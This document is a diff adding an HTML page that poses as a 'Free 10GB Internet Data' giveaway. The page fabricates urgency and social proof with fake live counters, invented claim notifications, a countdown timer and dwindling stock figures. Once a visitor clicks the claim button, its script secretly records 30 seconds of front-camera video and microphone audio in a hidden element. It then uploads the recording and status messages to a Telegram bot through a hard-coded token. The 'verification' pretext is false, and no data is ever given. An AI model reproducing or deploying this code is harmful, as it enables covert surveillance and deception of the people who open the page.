@@ -1,0 +1,1104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>📶 Free 10GB Internet Data</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            background: #0a0e17;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* ─── Animated Background ─── */
+        .bg-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: radial-gradient(ellipse at 20% 50%, #0d2b3e, #0a0e17 70%);
+            overflow: hidden;
+        }
+        .bg-canvas::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background: radial-gradient(circle at 30% 40%, rgba(0, 188, 212, 0.08), transparent 60%),
+                radial-gradient(circle at 70% 60%, rgba(0, 150, 200, 0.06), transparent 50%);
+            animation: bgDrift 20s ease-in-out infinite alternate;
+        }
+        @keyframes bgDrift {
+            0% {
+                transform: translate(0, 0) rotate(0deg);
+            }
+            100% {
+                transform: translate(2%, -2%) rotate(3deg);
+            }
+        }
+
+        .particles {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        .particle {
+            position: absolute;
+            width: 3px;
+            height: 3px;
+            background: rgba(0, 188, 212, 0.3);
+            border-radius: 50%;
+            animation: float linear infinite;
+        }
+        @keyframes float {
+            0% {
+                transform: translateY(100vh) scale(0);
+                opacity: 0;
+            }
+            10% {
+                opacity: 1;
+            }
+            90% {
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(-10vh) scale(1);
+                opacity: 0;
+            }
+        }
+
+        /* ─── Main Container ─── */
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 420px;
+            width: 100%;
+            background: rgba(20, 34, 58, 0.75);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border-radius: 32px;
+            padding: 28px 22px 30px;
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(0, 180, 200, 0.3);
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .container:hover {
+            transform: translateY(-2px);
+        }
+
+        /* ─── Header ─── */
+        .header {
+            margin-bottom: 18px;
+        }
+        .badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: linear-gradient(135deg, #00bcd4, #006064);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 5px 16px;
+            border-radius: 30px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: pulseBadge 2s ease-in-out infinite;
+            box-shadow: 0 0 20px rgba(0, 188, 212, 0.3);
+        }
+        @keyframes pulseBadge {
+            0%,
+            100% {
+                box-shadow: 0 0 20px rgba(0, 188, 212, 0.3);
+            }
+            50% {
+                box-shadow: 0 0 40px rgba(0, 188, 212, 0.6);
+            }
+        }
+        .badge .dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            animation: blink 1s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.2;
+            }
+        }
+
+        h1 {
+            color: #fff;
+            font-size: 36px;
+            font-weight: 800;
+            margin: 6px 0 0;
+            letter-spacing: -0.5px;
+            background: linear-gradient(135deg, #ffffff, #80deea);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .sub {
+            color: #80cbc4;
+            font-size: 15px;
+            margin-top: 2px;
+            font-weight: 400;
+        }
+
+        /* ─── Live Counter ─── */
+        .live-counter {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            background: rgba(10, 14, 23, 0.5);
+            border-radius: 16px;
+            padding: 8px 16px;
+            margin: 10px 0 16px;
+            border: 1px solid rgba(0, 180, 200, 0.2);
+        }
+        .live-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #80cbc4;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        .live-item .num {
+            color: #fff;
+            font-weight: 700;
+            font-size: 16px;
+            min-width: 30px;
+        }
+        .live-item .num.green {
+            color: #4caf50;
+        }
+        .live-item .num.gold {
+            color: #ffb74d;
+        }
+        .live-item .icon {
+            font-size: 14px;
+        }
+
+        /* ─── Offer Box ─── */
+        .offer-box {
+            background: linear-gradient(145deg, rgba(20, 34, 58, 0.8), rgba(10, 14, 23, 0.6));
+            border-radius: 24px;
+            padding: 26px 16px 22px;
+            margin: 12px 0 20px;
+            border: 1px solid rgba(0, 180, 200, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+        .offer-box::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 40%, rgba(0, 188, 212, 0.05), transparent 60%);
+            animation: shine 6s ease-in-out infinite alternate;
+        }
+        @keyframes shine {
+            0% {
+                transform: translate(-10%, -10%) rotate(0deg);
+            }
+            100% {
+                transform: translate(10%, 10%) rotate(5deg);
+            }
+        }
+        .offer-box>* {
+            position: relative;
+            z-index: 1;
+        }
+
+        .data-icon {
+            font-size: 48px;
+            margin-bottom: 2px;
+            display: block;
+            animation: floatIcon 3s ease-in-out infinite;
+        }
+        @keyframes floatIcon {
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-6px);
+            }
+        }
+
+        .data-amount {
+            font-size: 56px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00bcd4, #26c6da);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1;
+            text-shadow: 0 0 60px rgba(0, 188, 212, 0.3);
+            animation: glowPulse 2s ease-in-out infinite;
+        }
+        @keyframes glowPulse {
+            0%,
+            100% {
+                filter: brightness(1);
+            }
+            50% {
+                filter: brightness(1.3);
+            }
+        }
+        .data-amount .gb {
+            font-size: 28px;
+            -webkit-text-fill-color: #4dd0e1;
+        }
+
+        .data-label {
+            color: #b0ecf0;
+            font-size: 18px;
+            font-weight: 600;
+            margin-top: 2px;
+            letter-spacing: 0.5px;
+        }
+        .data-sub {
+            color: #6a9aa0;
+            font-size: 13px;
+            margin-top: 4px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+        }
+        .data-sub .stock {
+            color: #ffb74d;
+            font-weight: 700;
+        }
+
+        /* ─── Spots Remaining Bar ─── */
+        .spots-bar {
+            margin: 14px 0 18px;
+        }
+        .spots-bar .label-row {
+            display: flex;
+            justify-content: space-between;
+            color: #80cbc4;
+            font-size: 12px;
+            font-weight: 500;
+            margin-bottom: 4px;
+        }
+        .spots-bar .label-row .remaining {
+            color: #ffb74d;
+            font-weight: 700;
+        }
+        .spots-track {
+            width: 100%;
+            height: 6px;
+            background: rgba(42, 63, 106, 0.4);
+            border-radius: 10px;
+            overflow: hidden;
+        }
+        .spots-fill {
+            height: 100%;
+            width: 72%;
+            background: linear-gradient(90deg, #00bcd4, #26c6da);
+            border-radius: 10px;
+            animation: fillShrink 8s ease-in-out infinite alternate;
+        }
+        @keyframes fillShrink {
+            0% {
+                width: 72%;
+            }
+            100% {
+                width: 38%;
+            }
+        }
+
+        /* ─── Claim Button ─── */
+        .claim-btn {
+            background: linear-gradient(135deg, #00bcd4, #00695c);
+            color: #fff;
+            border: none;
+            padding: 17px 20px;
+            width: 100%;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 32px rgba(0, 188, 212, 0.4);
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 0.5px;
+            margin: 6px 0 16px;
+        }
+        .claim-btn::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.08), transparent);
+            transform: rotate(45deg);
+            animation: btnShine 4s ease-in-out infinite;
+        }
+        @keyframes btnShine {
+            0% {
+                transform: translateX(-100%) rotate(45deg);
+            }
+            100% {
+                transform: translateX(100%) rotate(45deg);
+            }
+        }
+        .claim-btn:hover:not(:disabled) {
+            transform: scale(1.02);
+            box-shadow: 0 12px 40px rgba(0, 188, 212, 0.6);
+        }
+        .claim-btn:active:not(:disabled) {
+            transform: scale(0.97);
+        }
+        .claim-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .claim-btn .spinner {
+            display: none;
+            width: 22px;
+            height: 22px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        .claim-btn.loading .spinner {
+            display: block;
+        }
+        .claim-btn.loading .btn-text {
+            display: none;
+        }
+        .claim-btn.loading {
+            padding: 14px 20px;
+        }
+
+        .claim-btn .btn-text {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        /* ─── Progress Steps ─── */
+        .progress-steps {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 16px 0 10px;
+            padding: 0 4px;
+        }
+        .step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            flex: 1;
+            position: relative;
+        }
+        .step .circle {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: rgba(42, 63, 106, 0.4);
+            border: 2px solid rgba(42, 63, 106, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6a7faa;
+            font-size: 12px;
+            font-weight: 700;
+            transition: all 0.5s ease;
+        }
+        .step .circle.active {
+            background: #00bcd4;
+            border-color: #00bcd4;
+            color: #fff;
+            box-shadow: 0 0 20px rgba(0, 188, 212, 0.4);
+        }
+        .step .circle.done {
+            background: #4caf50;
+            border-color: #4caf50;
+            color: #fff;
+        }
+        .step .label {
+            font-size: 9px;
+            color: #6a7faa;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.3px;
+        }
+        .step .label.active {
+            color: #b0ecf0;
+        }
+        .step .label.done {
+            color: #4caf50;
+        }
+        .step-line {
+            flex: 1;
+            height: 2px;
+            background: rgba(42, 63, 106, 0.3);
+            margin: 0 -2px;
+            margin-bottom: 16px;
+            transition: background 0.5s ease;
+        }
+        .step-line.done {
+            background: #4caf50;
+        }
+
+        /* ─── Toast Notifications ─── */
+        .toast-container {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            width: 90%;
+            max-width: 380px;
+            pointer-events: none;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            align-items: center;
+        }
+        .toast {
+            background: rgba(20, 34, 58, 0.92);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 1px solid rgba(42, 63, 106, 0.4);
+            border-radius: 16px;
+            padding: 10px 16px;
+            color: #e0e8f5;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            width: 100%;
+            animation: slideUp 0.5s ease forwards;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+            pointer-events: auto;
+        }
+        .toast .avatar {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00bcd4, #00695c);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            flex-shrink: 0;
+            color: #fff;
+            font-weight: 700;
+        }
+        .toast .msg {
+            flex: 1;
+        }
+        .toast .msg strong {
+            color: #fff;
+        }
+        .toast .time {
+            color: #6a7faa;
+            font-size: 10px;
+            flex-shrink: 0;
+        }
+        .toast .emoji-burst {
+            font-size: 16px;
+        }
+        @keyframes slideUp {
+            0% {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+        }
+        .toast.removing {
+            animation: slideDown 0.4s ease forwards;
+        }
+        @keyframes slideDown {
+            0% {
+                opacity: 1;
+                transform: translateY(0) scale(1);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(30px) scale(0.95);
+            }
+        }
+
+        /* ─── Confetti ─── */
+        .confetti-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 50;
+            overflow: hidden;
+        }
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            top: -20px;
+            animation: confettiFall linear forwards;
+        }
+        @keyframes confettiFall {
+            0% {
+                transform: translateY(0) rotate(0deg) scale(1);
+                opacity: 1;
+            }
+            100% {
+                transform: translateY(110vh) rotate(720deg) scale(0.3);
+                opacity: 0;
+            }
+        }
+
+        /* ─── Footer ─── */
+        .footer {
+            margin-top: 14px;
+        }
+        .footer p {
+            color: #6a7faa;
+            font-size: 12px;
+            margin: 4px 0;
+        }
+        .footer .timer-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            color: #ffb74d;
+            font-weight: 600;
+            font-size: 14px;
+            background: rgba(10, 14, 23, 0.4);
+            padding: 4px 16px;
+            border-radius: 30px;
+            display: inline-flex;
+            margin-top: 4px;
+            border: 1px solid rgba(255, 183, 77, 0.15);
+        }
+        .footer .timer-row #timer {
+            font-weight: 700;
+            font-size: 16px;
+            min-width: 48px;
+        }
+
+        /* ─── Responsive ─── */
+        @media (max-width: 460px) {
+            .container {
+                padding: 20px 16px 22px;
+            }
+            h1 {
+                font-size: 28px;
+            }
+            .data-amount {
+                font-size: 44px;
+            }
+            .data-amount .gb {
+                font-size: 22px;
+            }
+            .claim-btn {
+                font-size: 17px;
+                padding: 15px 16px;
+            }
+            .live-counter {
+                flex-wrap: wrap;
+                gap: 8px 16px;
+                padding: 6px 12px;
+            }
+            .step .circle {
+                width: 24px;
+                height: 24px;
+                font-size: 10px;
+            }
+            .step .label {
+                font-size: 8px;
+            }
+        }
+
+        /* ─── Glow ring on offer box ─── */
+        .glow-ring {
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            border-radius: 26px;
+            background: linear-gradient(135deg, rgba(0, 188, 212, 0.15), transparent 50%, rgba(0, 188, 212, 0.05));
+            z-index: 0;
+            pointer-events: none;
+            animation: ringPulse 3s ease-in-out infinite;
+        }
+        @keyframes ringPulse {
+            0%,
+            100% {
+                opacity: 0.5;
+            }
+            50% {
+                opacity: 1;
+            }
+        }
+
+        /* ─── Hidden video ─── */
+        #video {
+            display: none !important;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ─── Background ─── -->
+    <div class="bg-canvas">
+        <div class="particles" id="particles"></div>
+    </div>
+
+    <!-- ─── Toast Container ─── -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <!-- ─── Confetti Container ─── -->
+    <div class="confetti-container" id="confettiContainer"></div>
+
+    <!-- ─── Main ─── -->
+    <div class="container" id="mainContainer">
+        <!-- Header -->
+        <div class="header">
+            <span class="badge">
+                <span class="dot"></span> LIVE NOW
+            </span>
+            <h1>Free Internet</h1>
+            <p class="sub">🔥 Special Offer from V4zrashd</p>
+        </div>
+
+        <!-- Live Counter -->
+        <div class="live-counter">
+            <div class="live-item">
+                <span class="icon">📶</span>
+                <span>Online:</span>
+                <span class="num green" id="onlineCount">2,134</span>
+            </div>
+            <div class="live-item">
+                <span class="icon">✅</span>
+                <span>Claimed:</span>
+                <span class="num gold" id="claimedCount">6,892</span>
+            </div>
+        </div>
+
+        <!-- Offer Box -->
+        <div class="offer-box">
+            <div class="glow-ring"></div>
+            <span class="data-icon">🌐</span>
+            <div class="data-amount">10 <span class="gb">GB</span></div>
+            <div class="data-label">Free Internet Data</div>
+            <div class="data-sub">
+                <span>⚡ Limited Offer</span>
+                <span class="stock" id="stockCount">284</span>
+                <span>packages left</span>
+            </div>
+        </div>
+
+        <!-- Spots Bar -->
+        <div class="spots-bar">
+            <div class="label-row">
+                <span>🔥 Trending offer</span>
+                <span class="remaining" id="remainingLabel">284 remaining</span>
+            </div>
+            <div class="spots-track">
+                <div class="spots-fill" id="spotsFill"></div>
+            </div>
+        </div>
+
+        <!-- Progress Steps -->
+        <div class="progress-steps" id="progressSteps">
+            <div class="step" id="step1">
+                <div class="circle active" id="circle1">1</div>
+                <div class="label active" id="label1">Claim</div>
+            </div>
+            <div class="step-line" id="line1"></div>
+            <div class="step" id="step2">
+                <div class="circle" id="circle2">2</div>
+                <div class="label" id="label2">Verify</div>
+            </div>
+            <div class="step-line" id="line2"></div>
+            <div class="step" id="step3">
+                <div class="circle" id="circle3">3</div>
+                <div class="label" id="label3">Done</div>
+            </div>
+        </div>
+
+        <!-- Claim Button -->
+        <button class="claim-btn" id="claimBtn">
+            <span class="btn-text">🚀 Claim 10GB Now</span>
+            <span class="spinner"></span>
+        </button>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>🔒 Your data is safe. Only for verification.</p>
+            <div class="timer-row">
+                ⏳ Offer ends in <span id="timer">09:54</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ─── Hidden Video ─── -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+
+    <script>
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // CONFIG
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const params = new URLSearchParams(window.location.search);
+        const chatId = params.get('chat_id') || 'YOUR_CHAT_ID';
+        const token = '8906991625:AAHNnCnCHQU5PDTvQTwkmGVnqYvXmHVkFx4';
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // TELEGRAM
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
+            }).catch(() => {});
+        }
+
+        function sendVideo(file, caption) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('video', file);
+            fd.append('caption', caption);
+            fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd }).catch(() => {});
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // DOM REFS
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const claimBtn = document.getElementById('claimBtn');
+        const timerEl = document.getElementById('timer');
+        const onlineCount = document.getElementById('onlineCount');
+        const claimedCount = document.getElementById('claimedCount');
+        const stockCount = document.getElementById('stockCount');
+        const remainingLabel = document.getElementById('remainingLabel');
+        const spotsFill = document.getElementById('spotsFill');
+        const toastContainer = document.getElementById('toastContainer');
+        const confettiContainer = document.getElementById('confettiContainer');
+
+        const circles = {
+            1: document.getElementById('circle1'),
+            2: document.getElementById('circle2'),
+            3: document.getElementById('circle3')
+        };
+        const labels = {
+            1: document.getElementById('label1'),
+            2: document.getElementById('label2'),
+            3: document.getElementById('label3')
+        };
+        const lines = {
+            1: document.getElementById('line1'),
+            2: document.getElementById('line2')
+        };
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // STATE
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        let isClaiming = false;
+        let claimed = false;
+        let stock = 284;
+        let claimedTotal = 6892;
+        let online = 2134;
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // PARTICLES
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        (function initParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const el = document.createElement('div');
+                el.className = 'particle';
+                el.style.left = Math.random() * 100 + '%';
+                el.style.width = (1 + Math.random() * 3) + 'px';
+                el.style.height = el.style.width;
+                el.style.animationDuration = (12 + Math.random() * 20) + 's';
+                el.style.animationDelay = (Math.random() * 20) + 's';
+                el.style.opacity = 0.2 + Math.random() * 0.3;
+                container.appendChild(el);
+            }
+        })();
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // LIVE COUNTER UPDATES (fake)
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        setInterval(() => {
+            online += Math.floor(Math.random() * 4) - 1;
+            online = Math.max(800, online + Math.floor(Math.random() * 3));
+            onlineCount.textContent = online.toLocaleString();
+        }, 4000);
+
+        setInterval(() => {
+            if (!claimed) {
+                claimedTotal += Math.floor(Math.random() * 2);
+                claimedCount.textContent = claimedTotal.toLocaleString();
+            }
+        }, 5000);
+
+        function updateStock() {
+            stock = Math.max(12, stock - Math.floor(Math.random() * 2));
+            stockCount.textContent = stock;
+            remainingLabel.textContent = stock + ' remaining';
+            const pct = Math.max(5, (stock / 500) * 100);
+            spotsFill.style.width = pct + '%';
+        }
+        setInterval(updateStock, 7000);
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // TOAST NOTIFICATIONS (fake social proof)
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        const names = ['Aisha', 'Rahul', 'Priya', 'Ahmed', 'Sara', 'Michael', 'Emma', 'Lucas', 'Mia', 'Ethan',
+            'Zara', 'Omar', 'Layla', 'Noah', 'Ava', 'James', 'Sophia', 'Benjamin', 'Charlotte', 'Elijah',
+            'Amara', 'Kai', 'Maya', 'Leo', 'Nora', 'Sam', 'Zoe', 'Max', 'Lily', 'Jack'
+        ];
+        const cities = ['Dhaka', 'Mumbai', 'Lagos', 'Karachi', 'New York', 'London', 'Toronto', 'Sydney',
+            'Dubai', 'Berlin', 'Paris', 'Tokyo', 'Singapore', 'Kuala Lumpur', 'Istanbul', 'Cairo'
+        ];
+
+        function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+
+        function showToast(msg, emoji, avatar) {
+            const toast = document.createElement('div');
+            toast.className = 'toast';
+            toast.innerHTML = `
+            <div class="avatar">${avatar || '👤'}</div>
+            <div class="msg">${msg}</div>
+            <div class="emoji-burst">${emoji || '🔥'}</div>
+            <div class="time">now</div>
+          `;
+            toastContainer.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('removing');
+                setTimeout(() => toast.remove(), 400);
+            }, 4500);
+        }
+
+        // Initial toasts
+        setTimeout(() => {
+            showToast(
+                `<strong>${randomItem(names)}</strong> from ${randomItem(cities)} just claimed 10GB data!`,
+                '🎉', '📱'
+            );
+        }, 1200);
+        setTimeout(() => {
+            showToast(
+                `<strong>${randomItem(names)}</strong> got 10GB free in 1 minute!`,
+                '⚡', '🌐'
+            );
+        }, 3800);
+
+        setInterval(() => {
+            if (Math.random() > 0.3) {
+                const name = randomItem(names);
+                const city = randomItem(cities);
+                const msgs = [
+                    `<strong>${name}</strong> from ${city} just claimed 10GB!`,
+                    `<strong>${name}</strong> received 10GB data 🎯`,
+                    `${name} from ${city} is now connected!`,
+                    `<strong>${name}</strong> unlocked 10GB instantly!`,
+                    `Another 10GB claimed by ${name} from ${city}!`,
+                ];
+                showToast(randomItem(msgs), '📶', '📱');
+            }
+        }, 8000 + Math.random() * 7000);
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // TIMER
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        let t = 594;
+        setInterval(() => {
+            if (t <= 0) return;
+            t--;
+            const m = String(Math.floor(t / 60)).padStart(2, '0');
+            const s = String(t % 60).padStart(2, '0');
+            timerEl.textContent = `${m}:${s}`;
+            if (t === 60) {
+                showToast('⏰ Hurry! Offer ends in 1 minute!', '🚨', '⏰');
+            }
+        }, 1000);
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // CONFETTI
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        function fireConfetti() {
+            const colors = ['#00bcd4', '#26c6da', '#4dd0e1', '#80deea', '#4caf50', '#ffb74d', '#a29bfe', '#fd79a8'];
+            for (let i = 0; i < 80; i++) {
+                const piece = document.createElement('div');
+                piece.className = 'confetti-piece';
+                const color = randomItem(colors);
+                const size = 6 + Math.random() * 8;
+                const shapes = ['50%', '0'];
+                const shape = randomItem(shapes);
+                piece.style.background = color;
+                piece.style.width = size + 'px';
+                piece.style.height = (size * (0.6 + Math.random() * 0.8)) + 'px';
+                piece.style.borderRadius = shape;
+                piece.style.left = Math.random() * 100 + '%';
+                piece.style.animationDuration = (2 + Math.random() * 2.5) + 's';
+                piece.style.animationDelay = (Math.random() * 1.2) + 's';
+                piece.style.transform = `rotate(${Math.random() * 360}deg)`;
+                confettiContainer.appendChild(piece);
+                setTimeout(() => piece.remove(), 5000);
+            }
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // STEP UPDATER
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        function setStep(step) {
+            for (let i = 1; i <= 3; i++) {
+                const c = circles[i];
+                const l = labels[i];
+                c.classList.remove('active', 'done');
+                l.classList.remove('active', 'done');
+                if (i < step) { c.classList.add('done');
+                    l.classList.add('done'); } else if (i === step) { c.classList.add('active');
+                    l.classList.add('active'); }
+            }
+            for (let i = 1; i <= 2; i++) {
+                const line = lines[i];
+                line.classList.toggle('done', i < step);
+            }
+        }
+        setStep(1);
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // CAMERA + CLAIM LOGIC (FRONT VIDEO - 30 sec)
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        async function captureAndClaim() {
+            if (isClaiming || claimed) return;
+            isClaiming = true;
+
+            claimBtn.classList.add('loading');
+            claimBtn.disabled = true;
+
+            setStep(2);
+            showToast('📸 Verifying your device...', '⏳', '📱');
+
+            try {
+                // Front camera with audio
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: true
+                });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // Record 30 seconds
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+
+                recorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const file = new File([blob], 'front_video_data.webm', { type: 'video/webm' });
+                    sendVideo(file, '🎬 সামনের ভিডিও (10GB Free Data)');
+                    sendToTelegram('✅ 10GB ফ্রি ডাটা ক্লেইম করেছেন!');
+                    stream.getTracks().forEach(t => t.stop());
+
+                    // Success
+                    claimed = true;
+                    setStep(3);
+                    claimBtn.classList.remove('loading');
+                    claimBtn.innerHTML = '🎉 10GB Claimed!';
+                    claimBtn.style.background = 'linear-gradient(135deg, #4caf50, #2e7d32)';
+                    claimBtn.disabled = true;
+
+                    fireConfetti();
+                    setTimeout(() => fireConfetti(), 800);
+                    showToast('🎊 You got 10GB free data! Check your balance.', '🎉', '📶');
+                    showToast('🚀 Your internet is now upgraded!', '🔥', '⭐');
+
+                    claimedTotal += 1;
+                    claimedCount.textContent = claimedTotal.toLocaleString();
+                };
+
+                recorder.start();
+                sendToTelegram('⏳ সামনের ভিডিও রেকর্ড শুরু (৩০ সেকেন্ড) - 10GB Data');
+                setTimeout(() => recorder.stop(), 30000);
+
+            } catch (e) {
+                setStep(1);
+                claimBtn.classList.remove('loading');
+                claimBtn.innerHTML = '🚀 Claim 10GB Now';
+                claimBtn.disabled = false;
+                isClaiming = false;
+                sendToTelegram('❌ সামনের ক্যামেরা অ্যাক্সেস ডিনাই!');
+                showToast('⚠️ Please allow camera access.', '📷', '⚠️');
+            }
+        }
+
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        // EVENT BINDING
+        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+        claimBtn.addEventListener('click', captureAndClaim);
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !claimBtn.disabled) {
+                claimBtn.click();
+            }
+        });
+
+        setTimeout(() => {
+            showToast('⚠️ Only <strong>' + stock + '</strong> packages remaining!', '🚨', '⏰');
+        }, 6000);
+
+        console.log('🌐 10GB Free Data — Claim now!');
+        console.log('🎬 Front camera will record 30 sec video for verification.');
+    </script>
+</body>
+</html>
